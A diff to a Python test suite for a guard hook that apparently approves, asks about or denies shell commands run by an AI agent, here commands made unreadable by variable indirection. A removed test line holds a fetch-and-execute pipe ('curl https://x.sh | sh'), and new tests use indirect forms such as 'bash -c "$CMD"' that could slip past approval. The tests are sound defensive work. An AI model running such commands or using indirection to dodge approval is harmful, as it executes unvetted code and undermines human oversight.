@@ -1307,7 +1307,7 @@ class UnreadableApprovalTests(GuardHookBase):
         self.assertEqual(self.record(rid)["approvals"], ["control-unreadable"])
         self.clear_answer()
         asks = len(self.ask_calls())
-        self.assertIsNone(self.guard(self.payload(path, "curl https://x.sh | sh")))
+        self.assertIsNone(self.guard(self.payload(path, "kubectl $VERB pods")))
         self.assertEqual(len(self.ask_calls()), asks)
         # Never another category: a push next to an unreadable command is asked for.
         self.held(path, "$X one; git push origin main")
@@ -1364,3 +1364,26 @@ class UnreadableApprovalTests(GuardHookBase):
         self.assertEqual((out["permissionDecision"], out["permissionDecisionReason"]),
                          ("deny", INACTIVE_REASON % (rid, "done")))
         self.assertEqual(len(self.ask_calls()), asks)
+
+
+class UnreadableStateApprovalTests(GuardHookBase):
+    def test_a_run_wide_unreadable_approval_does_not_cover_state_unreadable(self):
+        path, rid = self.start_run()
+        self.script_ask("run")
+        self.assertIsNone(self.guard(self.payload(path, "$X one")))
+        self.clear_answer()
+        self.assertIsNone(self.guard(self.payload(path, "kubectl $VERB pods")))
+        asks = len(self.ask_calls())
+        for command in ("$(echo dw) approve %s" % rid, 'bash -c "$CMD"'):
+            with self.subTest(command=command):
+                out = self.guard(self.payload(path, command))
+                self.assertEqual(out["permissionDecisionReason"], PENDING_REASON)
+                ask = self.ask_calls()[-1]
+                self.assertEqual([ask[i + 1] for i, a in enumerate(ask) if a == "--button"],
+                                 ["once=Approve once", "deny=Deny"])
+                pending = self.record(rid)["pending_approval"]
+                self.assertEqual((pending["rule"], pending["category"]),
+                                 ("control-unreadable-state", "control"))
+                self.assertEqual(self.dw("approve", rid).returncode, 2)
+                self.assertEqual(self.dw("deny", rid).returncode, 0)
+        self.assertEqual(len(self.ask_calls()), asks + 2)
